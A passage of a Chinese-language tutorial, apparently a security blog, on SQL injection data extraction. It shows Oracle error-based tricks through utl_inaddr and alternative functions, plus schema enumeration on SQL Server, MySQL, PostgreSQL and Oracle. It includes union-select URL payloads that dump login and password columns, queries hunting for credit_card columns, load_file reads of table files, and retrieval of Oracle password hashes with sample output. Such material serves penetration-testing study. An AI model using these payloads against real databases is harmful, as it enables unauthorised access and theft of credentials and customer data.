class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> rownum r<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">from</span> dba_users<span class="token punctuation">)</span> <span class="token keyword">where</span> r<span class="token operator">=</span><span class="token number">2</span>ORA<span class="token operator">-</span><span class="token number">29257</span>: host SYSTEM<span class="token operator">=</span>E45049312A231FD1 unknown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>绕过单行限制以获取多行信息。可通过使用带XML的专用SQL语句或专用的Oracle函数stragg(11g+)来在单行中获取所有行,上述两种方法唯一的限制是输出大小(最大为 4000字节)：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> xmltransform<span class="token punctuation">(</span>sys_xmlagg<span class="token punctuation">(</span>sys_xmlgen<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>xmltype<span class="token punctuation">(</span><span class="token string">'&lt;?xml version="l.0"?&gt;&lt;xsl:stylesheet version="l.0"xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;&lt;xsl:template match:"/"&gt;&lt;xsl:for-each select="/ROWSET/USERNAME"&gt;&lt;xsl:value-of select="text()"/&gt;;&lt;/xsl:for-each&lt;/xsl:template &lt;/xsl:stylesheet&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getstringval<span class="token punctuation">(</span><span class="token punctuation">)</span> listagg <span class="token keyword">from</span> all_users<span class="token punctuation">;</span><span class="token keyword">select</span> sys<span class="token punctuation">.</span>stragg<span class="token punctuation">(</span><span class="token keyword">distinct</span> username<span class="token operator">||</span><span class="token string">';'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> all_users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这段代码注入utl_inaddr中，就会输出所有用户名：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ALEX<span class="token punctuation">;</span>ANONYMOUS<span class="token punctuation">;</span>APEX_PUBLIC_USER<span class="token punctuation">;</span>CTXSYS<span class="token punctuation">;</span>DBSNMP<span class="token punctuation">;</span>DEMO1<span class="token punctuation">;</span>DIP<span class="token punctuation">;</span>DUMMY<span class="token punctuation">;</span>EXFSYS<span class="token punctuation">;</span>FLOWS_030000<span class="token punctuation">;</span>FLOWS_FILES<span class="token punctuation">;</span>MDDATA<span class="token punctuation">;</span>MDSYS<span class="token punctuation">;</span>MGMT_VIEW<span class="token punctuation">;</span>MONODEMO<span class="token punctuation">;</span>OLAPSYS<span class="token punctuation">;</span>ORACLE_OCM<span class="token punctuation">;</span>ORDPLUGINS<span class="token punctuation">;</span>ORDSYS<span class="token punctuation">;</span>OUTLN<span class="token punctuation">;</span>OWBSYS<span class="token punctuation">;</span>PHP<span class="token punctuation">;</span>PLSQL<span class="token punctuation">;</span>SCOTT<span class="token punctuation">;</span>SI_INFORMTN_SCHEMA<span class="token punctuation">;</span>SPATIAL_CSW_ADMIN_USR<span class="token punctuation">;</span>SPATIAL_WFS_ADMIN_USR<span class="token punctuation">;</span>SYS<span class="token punctuation">;</span>SYSMAN<span class="token punctuation">;</span>SYSTEM<span class="token punctuation">;</span>TSMSYS<span class="token punctuation">;</span>WKPROXY<span class="token punctuation">;</span>WKSYS<span class="token punctuation">;</span>WK_TEST<span class="token punctuation">;</span>WMSYS<span class="token punctuation">;</span>X<span class="token punctuation">;</span>XDB<span class="token punctuation">;</span>XS<span class="token variable">$NULL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>默认情况下，oracle llg通过ACL来限制对utl_inaddr和其他网络包访问，这时会得到报错network access denied by access control list，这种情况或者utl_inaddr取消了public权限，就要另外用其他函数了，下面列举函数</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#注入下列内容:</span>Or <span class="token assign-left variable">1</span><span class="token operator">=</span>ORDSYS.ORD_DICOM.GETMAPPINGXPATH<span class="token punctuation">(</span>user,<span class="token string">'a'</span>,<span class="token string">'b'</span><span class="token punctuation">)</span>-- <span class="token comment">#返回下列内容：</span>ORA-53044: invalid tag: VICTIMUSER<span class="token comment">#注入下列内容：</span>or <span class="token assign-left variable">1</span><span class="token operator">=</span>SYS.DBMS_AW_XML.READAWMETADATA<span class="token punctuation">(</span>user,<span class="token string">'a'</span><span class="token punctuation">)</span>-- <span class="token comment">#返回下列内容：</span>ORA-29532: Java call terminated by uncaught Java exception: oracle.AWXML.AWException: oracle.AWXML.AWException: An error has occurred, on the serverError class: Express FailureServer error descriptions:ENG: ORA-34344: Analytic workspace VICTIMUSER is not attached.<span class="token comment">#注入下列内容：</span>Or <span class="token assign-left variable">1</span><span class="token operator">=</span> CTXSYS.CTX_QUERY.CHK_XPATH<span class="token punctuation">(</span>user,<span class="token string">'a'</span>,<span class="token string">'b'</span><span class="token punctuation">)</span>--返回下列内容：ORA-20000: Oracle Text error:DRG-11701: thesaurus VICTIMUSER does not existORA-06512: at <span class="token string">"CTXSYS.DRUE"</span>, line <span class="token number">160</span>ORA-06512: at <span class="token string">"CTXSYS.DRITHSX"</span>, line <span class="token number">538</span>ORA-06512: at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="枚举数据库模式"><a href="#枚举数据库模式" class="headerlink" title="枚举数据库模式"></a>枚举数据库模式</h3><p>在拥有权限的前提下，将所有元数据全部枚举出来</p><h4 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h4><p>有一个返回指定商品的详细信息的页面<code>http://test</code></p><p>返回数据表列表</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test?id=12+union+select+null,name,null,null+from+master..sysdatabases</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>master数据库包含了其他数据库的元数据，如master..sysdatabases可以检索出数据库名称列表</p><p>e-shop数据库包含了电子商务应用使用的所有数据。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> db_name<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- 正在使用的数据库名称</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>枚举表名，每个数据都有一个名为<code>sysobjects</code>的表，假如想要检索e-shop数据库的表名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> e<span class="token operator">-</span>shop<span class="token punctuation">.</span><span class="token punctuation">.</span>sysobjects <span class="token keyword">WHERE</span> xtype<span class="token operator">=</span><span class="token string">'U'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到表名，枚举列名，以customers表为例</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> e<span class="token operator">-</span>shop<span class="token punctuation">.</span><span class="token punctuation">.</span>syscolumns <span class="token keyword">WHERE</span> id <span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> id <span class="token keyword">FROM</span> e<span class="token operator">-</span>shop<span class="token punctuation">.</span><span class="token punctuation">.</span>sysobjects <span class="token keyword">WHERE</span> name <span class="token operator">=</span> <span class="token string">'customers'</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这句SQL用的是镶嵌查询，先用里面的查出customers表的id，再通过id指定表查列名，也能使用连接查询</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> a<span class="token punctuation">.</span>name <span class="token keyword">FROM</span> e<span class="token operator">-</span>shop<span class="token punctuation">.</span><span class="token punctuation">.</span>syscolumns a<span class="token punctuation">,</span>e_shop<span class="token punctuation">.</span><span class="token punctuation">.</span>sysobjects b <span class="token keyword">WHERE</span>b<span class="token punctuation">.</span>name <span class="token operator">=</span><span class="token string">'customers'</span> <span class="token operator">AND</span> a<span class="token punctuation">.</span>id <span class="token operator">=</span> b<span class="token punctuation">.</span>id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>知道了列名，可以开始枚举字段，爆数据了，数据类型的检验前面说过</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test?id=12+union+select+null,login,password, null+from+e-shop..Customers-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>防暴力破解scrypt算法</p><h4 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h4><p>提取数据库名称, 然后转向表、列，最后是数据本身。</p><p>检索用户</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> current_users<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>没有管理员权限，大于5.0的版本能用information_schema，获取数据库名列表</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">schema</span> form information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>枚举表名，库名customers_db</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> table_schema<span class="token punctuation">,</span>table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">WHERE</span> table_schema<span class="token operator">=</span><span class="token string">'customers_db'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>枚举所有表名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> table_schema<span class="token punctuation">,</span>table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">WHERE</span> table_schema <span class="token operator">!=</span> <span class="token string">'mysql'</span> <span class="token operator">AND</span> table_schema <span class="token operator">!=</span> <span class="token string">'information_schema'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>检索列</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> table_schema<span class="token punctuation">,</span>table_name<span class="token punctuation">,</span>column_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_name<span class="token operator">=</span><span class="token string">'test'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>全部列</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> table_schema<span class="token punctuation">,</span>table_name<span class="token punctuation">,</span>column_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_schema <span class="token operator">!=</span> <span class="token string">'mysql'</span> <span class="token operator">AND</span> table_schema <span class="token operator">!=</span> <span class="token string">'information_schema'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就可以爆出数据库全部内容，当然你能加一些限制条件，找到你需要的数据</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> table_schema<span class="token punctuation">,</span>table_name<span class="token punctuation">,</span>column_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> column_name <span class="token operator">LIKE</span> <span class="token string">'password'</span> <span class="token operator">OR</span> column_name <span class="token operator">LIKE</span> <span class="token string">'credit_card'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询用户授权信息</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> grantee<span class="token punctuation">,</span>privilege_type<span class="token punctuation">,</span>is_grantable <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span>user_privileges<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5.0之前的数据库</p><p>先访问存储目标数据库的文件，将其原始内容导入到我们创建的一张表中，然后使用前面介绍的技术提取该表。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>数据库的文件保存在与数据库名称相同的目录下。此目录包含在主MySQL数据目录中，可使用下列查询来返回该目录：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> @<span class="token variable">@datadir</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>数据库的所有表包含在一个扩展名为MYD的文件中。例如，下面是数据库默认的 一些MYD文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tables_priv.MYDhost.MYDhelp_keyword.MYDcolumns_priv.MYDdb.MYD<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可使用下列查询提取该数据库中特定表的内容：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> load_file<span class="token punctuation">(</span><span class="token string">'databasename/tablename.MYD'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要是没有information_schema,就必须先暴力破解表名后才能成功执行该查询。load_file允许检索的字节数有个最大值，该值由<code>@@max_allowed_packet</code> 变量指定。所以该技术不适用于存储了大量数据的表。</p><h4 id="PostgreSQL-1"><a href="#PostgreSQL-1" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h4><p>检索所有数据库</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> datname <span class="token keyword">FROM</span> pg_database<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查找当前数据库</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> current_database<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>检索数据库用户列表</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> usename <span class="token keyword">from</span> pg_user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询当前用户</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">user</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token keyword">current_user</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token keyword">session_user</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> getpgusername<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>session_user返回启动当前数据库连接的用户，而current_user和user(二者是等价的)则返回当前执行上下文的用户，即返回用于检查许可权限的那个用户账号。除非在某处调用了 SET ROLE指令，否则二者通常返回相同的值。对于最后一条语句，getpgusername()将返回与当前线程关联的用户。</p><p>枚举所有模式中的全部表</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> c<span class="token punctuation">.</span>relname <span class="token keyword">FROM</span> pg_catalog<span class="token punctuation">.</span>pg_class c <span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span> pg_catalog<span class="token punctuation">.</span>pg_namespace n <span class="token keyword">ON</span> n<span class="token punctuation">.</span>oid <span class="token operator">=</span> c<span class="token punctuation">.</span>relnamespace <span class="token keyword">WHERE</span> c<span class="token punctuation">.</span>relkind <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'r'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">AND</span> n<span class="token punctuation">.</span>nspname <span class="token operator">NOT</span> <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'pg_catalog'</span><span class="token punctuation">,</span> <span class="token string">'pg_toast'</span><span class="token punctuation">)</span> <span class="token operator">AND</span> pg_catalog<span class="token punctuation">.</span>pg_table_is_visible<span class="token punctuation">(</span>c<span class="token punctuation">.</span>oid<span class="token punctuation">)</span><span class="token keyword">SELECT</span> tablename <span class="token keyword">FROM</span> pg_tables <span class="token keyword">WHERE</span> tablename <span class="token operator">NOT</span> <span class="token operator">LIKE</span> <span class="token string">'pg_%'</span> <span class="token operator">AND</span> tablename <span class="token operator">NOT</span> <span class="token operator">LIKE</span> <span class="token string">'sql_%'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>所有列(public下的)</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> relname<span class="token punctuation">,</span>A<span class="token punctuation">.</span>attname <span class="token keyword">FROM</span> pg_class C<span class="token punctuation">,</span>pg_namespace N<span class="token punctuation">,</span>pg_attribute A<span class="token punctuation">,</span>pg_type T <span class="token keyword">WHERE</span> <span class="token punctuation">(</span>C<span class="token punctuation">.</span>relkind<span class="token operator">=</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>N<span class="token punctuation">.</span>oid<span class="token operator">=</span>C<span class="token punctuation">.</span>relnamespace<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>attrelid<span class="token operator">=</span>C<span class="token punctuation">.</span>oid<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>atttypid<span class="token operator">=</span>T<span class="token punctuation">.</span>oid<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>attnum<span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span><span class="token operator">NOT</span> A<span class="token punctuation">.</span>attisdropped<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>N<span class="token punctuation">.</span>nspname <span class="token operator">ILIKE</span> <span class="token string">'public'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>passwd列</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> relname<span class="token punctuation">,</span>A<span class="token punctuation">.</span>attname <span class="token keyword">FROM</span> pg_class C<span class="token punctuation">,</span>pg_namespace N<span class="token punctuation">,</span>pg_attribute A<span class="token punctuation">,</span>pg_type T <span class="token keyword">WHERE</span> <span class="token punctuation">(</span>C<span class="token punctuation">.</span>relkind<span class="token operator">=</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>N<span class="token punctuation">.</span>oid<span class="token operator">=</span>C<span class="token punctuation">.</span>relnamespace<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>attrelid<span class="token operator">=</span>C<span class="token punctuation">.</span>oid<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>atttypid<span class="token operator">=</span>T<span class="token punctuation">.</span>oid<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>attnum<span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span><span class="token operator">NOT</span> A<span class="token punctuation">.</span>attisdropped<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>N<span class="token punctuation">.</span>nspname <span class="token operator">ILIKE</span> <span class="token string">'public'</span><span class="token punctuation">)</span> <span class="token operator">AND</span>attname <span class="token operator">LIKE</span> <span class="token string">'%passwd%'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h4><p>无法枚举存在的数据库</p><p>枚举所有属于当前用户的表</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> table_name <span class="token keyword">from</span> user_tables<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>枚举所有表和表的拥有者</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> owner<span class="token punctuation">,</span>table_name <span class="token keyword">from</span> all_tables<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>枚举更多关于应用表的信息以确定表中出现的列数和行数</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> a<span class="token punctuation">.</span>table_name<span class="token operator">||</span><span class="token string">'['</span><span class="token operator">||</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">']='</span><span class="token operator">||</span>num_rows <span class="token keyword">from</span> user_tab_columns a<span class="token punctuation">,</span>user_tables b <span class="token keyword">where</span> a<span class="token punctuation">.</span>table_name<span class="token operator">=</span>b<span class="token punctuation">.</span>table_name <span class="token keyword">group</span> <span class="token keyword">by</span>a<span class="token punctuation">.</span>table_name<span class="token punctuation">,</span>num_rowsEMP<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">14</span><span class="token keyword">DUMMY</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>DEPT<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">4</span>SALGRADE<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为所有可访问或可用的表枚举相同的信息，包括用户、表名以及表中包含的行数</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> b<span class="token punctuation">.</span>owner<span class="token operator">||</span><span class="token string">'.'</span><span class="token operator">||</span>a<span class="token punctuation">.</span>table_name<span class="token operator">||</span><span class="token string">'['</span><span class="token operator">||</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">']='</span><span class="token operator">||</span>num_rows <span class="token keyword">from</span> all_tab_columns a<span class="token punctuation">,</span>all_tables b <span class="token keyword">where</span> a<span class="token punctuation">.</span>table_name<span class="token operator">=</span>b<span class="token punctuation">.</span>table_name <span class="token keyword">group</span> <span class="token keyword">by</span> b<span class="token punctuation">.</span>owner<span class="token punctuation">,</span>a<span class="token punctuation">.</span>table_name<span class="token punctuation">,</span>num_rows<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>枚举每张表的列和数据类型以便更完整地了解数据库模式</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> table_name<span class="token operator">||</span><span class="token string">':'</span><span class="token operator">||</span>column_name<span class="token operator">||</span><span class="token string">':'</span><span class="token operator">||</span>data_type<span class="token operator">||</span><span class="token string">':'</span><span class="token operator">||</span>column_id <span class="token keyword">from</span> user_tab_columns <span class="token keyword">order</span> <span class="token keyword">by</span> table_name<span class="token punctuation">,</span>column_idDEPT:DEPTNO:NUMBER:<span class="token number">1</span>DEPT:DNAME:VARCHAR2:<span class="token number">2</span>DEPT:LOC:VARCHAR2:<span class="token number">3</span><span class="token keyword">DUMMY</span>:<span class="token keyword">DUMMY</span>:NUMBER:<span class="token number">1</span>EMP:EMPNO:NUMBER:<span class="token number">1</span>EMP:ENAME:VARCHAR2:<span class="token number">2</span>EMP:JOB:VARCHAR2:<span class="token number">3</span>EMP:MGR:NUMBER:<span class="token number">4</span>EMP:HIREDATE:<span class="token keyword">DATE</span>:<span class="token number">5</span>EMP:SAL:NUMBER:<span class="token number">6</span>EMP:COMM:NUMBER:<span class="token number">7</span>EMP:DEPTNO:NUMBER:<span class="token number">8</span>SALGRADE:GRADE:NUMBER:<span class="token number">1</span>SALGRADE:LOSAL:NUMBER:<span class="token number">2</span>SALGRADE:HISAL:NUMBER:<span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回当前数据库用户权限</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 获取当前用户的系统权限：</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_sys_privs<span class="token punctuation">;</span><span class="token comment">-- how system privileges of the current user</span><span class="token comment">-- 获取当前用户的角色权限：</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_role_privs<span class="token punctuation">;</span><span class="token comment">-- show role privileges of the current user</span><span class="token comment">-- 获取当前用户的表格权限：</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_tab_privs<span class="token punctuation">;</span><span class="token comment">-- 获取当前用户的列权限：</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_col_privs<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取所有可能的权限列表</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 获取所有系统权限：</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> all_sys_privs<span class="token punctuation">;</span><span class="token comment">-- 获取所有角色权限：</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> all_role_privs<span class="token punctuation">;</span><span class="token comment">-- 获取所有表权限：</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> all_tab_privs<span class="token punctuation">;</span><span class="token comment">-- 获取所有列权限：</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> all_col_privs<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回数据库中所有用户的列表，默认任意数据库用户可执行</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username<span class="token punctuation">,</span>created <span class="token keyword">from</span> all_users <span class="token keyword">order</span> <span class="token keyword">by</span> created <span class="token keyword">desc</span><span class="token punctuation">;</span>SCOTT<span class="token number">04</span><span class="token operator">-</span>JAN <span class="token operator">-</span><span class="token number">09</span>PHP<span class="token number">04</span><span class="token operator">-</span>JAN <span class="token operator">-</span><span class="token number">09</span>PLSQL<span class="token number">02</span><span class="token operator">-</span>JAN <span class="token operator">-</span><span class="token number">09</span>MONODEMO<span class="token number">29</span><span class="token operator">-</span><span class="token keyword">DEC</span> <span class="token operator">-</span><span class="token number">08</span>DEMO1<span class="token number">29</span><span class="token operator">-</span><span class="token keyword">DEC</span> <span class="token operator">-</span><span class="token number">08</span>ALEX<span class="token number">14</span><span class="token operator">-</span><span class="token keyword">DEC</span> <span class="token operator">-</span><span class="token number">08</span>OWBSYS<span class="token number">13</span><span class="token operator">-</span><span class="token keyword">DEC</span> <span class="token operator">-</span><span class="token number">08</span>FLOWS_030000<span class="token number">13</span><span class="token operator">-</span><span class="token keyword">DEC</span> <span class="token operator">-</span><span class="token number">08</span>APEX <span class="token keyword">PUBLIC</span> <span class="token keyword">USER</span><span class="token number">13</span><span class="token operator">-</span><span class="token keyword">DEC</span> <span class="token operator">-</span><span class="token number">08</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在Oracle 10g R2之后的版本中，普通用户可使用下列SELECT语句检索数据库的用户名和哈希口令</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name<span class="token punctuation">,</span> password<span class="token punctuation">,</span> astatus <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$ <span class="token keyword">where</span> <span class="token keyword">type</span><span class="token comment">#&gt;0 and length(password)=16 </span><span class="token comment">-- astatus (0=open, 9=locked&amp; expired)</span>SYS     AD24A888FC3B1BE7 <span class="token number">0</span>SYSTEM  BD3D49AD69E3FA34 <span class="token number">0</span>OUTLN   <span class="token number">4</span>A3BA55E08595081 <span class="token number">9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Oracle llg中，Oracle已经修改了所使用口令的哈希算法，而且哈希口令位于另外 一个不同的列中（spare4列），如下所示：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name<span class="token punctuation">,</span>spare4 <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$ <span class="token keyword">where</span> <span class="token 